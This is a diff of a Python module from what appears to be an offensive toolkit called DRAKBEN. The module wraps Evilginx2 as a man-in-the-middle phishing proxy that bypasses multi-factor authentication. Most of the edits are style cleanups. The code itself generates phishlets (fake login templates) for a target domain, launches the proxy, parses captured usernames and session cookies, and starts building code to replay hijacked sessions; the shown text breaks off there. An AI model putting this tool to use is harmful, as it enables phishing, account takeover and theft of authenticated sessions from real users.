@@ -1,5 +1,4 @@
-"""
-DRAKBEN Social Engineering - MFA Bypass (Evilginx2 Integration)
+"""DRAKBEN Social Engineering - MFA Bypass (Evilginx2 Integration)
 Author: @drak_ben
 Description: Man-in-the-Middle Proxy for 2FA/MFA bypass via session hijacking.
 """
@@ -15,7 +14,7 @@ logger = logging.getLogger(__name__)
 
 @dataclass
 class CapturedSession:
-    """Represents a captured authentication session"""
+    """Represents a captured authentication session."""
 
     target_url: str
     username: str
@@ -26,12 +25,11 @@ class CapturedSession:
 
 
 class MFABypass:
-    """
-    Evilginx2 integration for real-time MFA bypass.
+    """Evilginx2 integration for real-time MFA bypass.
     Captures session tokens after successful 2FA authentication.
     """
 
-    def __init__(self, evilginx_path: str = "/opt/evilginx2"):
+    def __init__(self, evilginx_path: str = "/opt/evilginx2") -> None:
         self.evilginx_path = evilginx_path
         self.phishlets_dir = os.path.join(evilginx_path, "phishlets")
         self.available = self._check_installation()
@@ -39,16 +37,16 @@ class MFABypass:
         self.captured_sessions: list[CapturedSession] = []
 
         logger.info(
-            f"MFA Bypass initialized (Evilginx2: {'Available' if self.available else 'Not Found'})"
+            f"MFA Bypass initialized (Evilginx2: {'Available' if self.available else 'Not Found'})",
         )
 
     def _check_installation(self) -> bool:
-        """Check if Evilginx2 is installed"""
+        """Check if Evilginx2 is installed."""
         binary_path = os.path.join(self.evilginx_path, "evilginx")
         return os.path.exists(binary_path)
 
     def list_phishlets(self) -> list[str]:
-        """List available phishlets (login page templates)"""
+        """List available phishlets (login page templates)."""
         phishlets = []
         if os.path.exists(self.phishlets_dir):
             for f in os.listdir(self.phishlets_dir):
@@ -57,11 +55,12 @@ class MFABypass:
         return phishlets
 
     def create_phishlet(
-        self, name: str, target_domain: str, login_path: str = "/login"
+        self,
+        name: str,
+        target_domain: str,
+        login_path: str = "/login",
     ) -> str:
-        """
-        Generate a custom phishlet for a target.
-        """
+        """Generate a custom phishlet for a target."""
         phishlet_content = f"""
 name: '{name}'
 author: 'Drakben'
@@ -98,16 +97,14 @@ login:
             os.makedirs(self.phishlets_dir, exist_ok=True)
             with open(phishlet_path, "w") as f:
                 f.write(phishlet_content)
-            logger.info(f"Phishlet created: {phishlet_path}")
+            logger.info("Phishlet created: %s", phishlet_path)
             return phishlet_path
         except Exception as e:
-            logger.error(f"Failed to create phishlet: {e}")
+            logger.exception("Failed to create phishlet: %s", e)
             return ""
 
     def start_proxy(self, _phishlet: str, _lure_domain: str) -> bool:
-        """
-        Start Evilginx2 in background mode.
-        """
+        """Start Evilginx2 in background mode."""
         if not self.available:
             logger.error("Evilginx2 not installed. Cannot start proxy.")
             return False
@@ -127,26 +124,25 @@ login:
                 cwd=self.evilginx_path,
             )
 
-            logger.info(f"Evilginx2 proxy started (PID: {self.process.pid})")
+            logger.info("Evilginx2 proxy started (PID: %s)", self.process.pid)
             return True
 
         except Exception as e:
-            logger.error(f"Failed to start Evilginx2: {e}")
+            logger.exception("Failed to start Evilginx2: %s", e)
             return False
 
     def stop_proxy(self) -> None:
-        """Stop Evilginx2 process"""
+        """Stop Evilginx2 process."""
         if self.process:
             self.process.terminate()
             self.process = None
             logger.info("Evilginx2 proxy stopped")
 
     def parse_captured_sessions(
-        self, log_file: str = "sessions.json"
+        self,
+        log_file: str = "sessions.json",
     ) -> list[CapturedSession]:
-        """
-        Parse captured sessions from Evilginx2 output.
-        """
+        """Parse captured sessions from Evilginx2 output."""
         sessions = []
         log_path = os.path.join(self.evilginx_path, log_file)
 
@@ -167,15 +163,13 @@ login:
                     sessions.append(session)
 
             except Exception as e:
-                logger.error(f"Failed to parse sessions: {e}")
+                logger.exception("Failed to parse sessions: %s", e)
 
         self.captured_sessions = sessions
         return sessions
 
     def replay_session(self, session: CapturedSession) -> dict[str, str]:
-        """
-        Generate curl command or requests code to replay captured session.
-        """
+        """Generate curl command or requests code to replay captured session."""
         cookies_str = "; ".join([f"{c['name']}={c['value']}" for c in session.cookies])
 
         replay_code = f"""
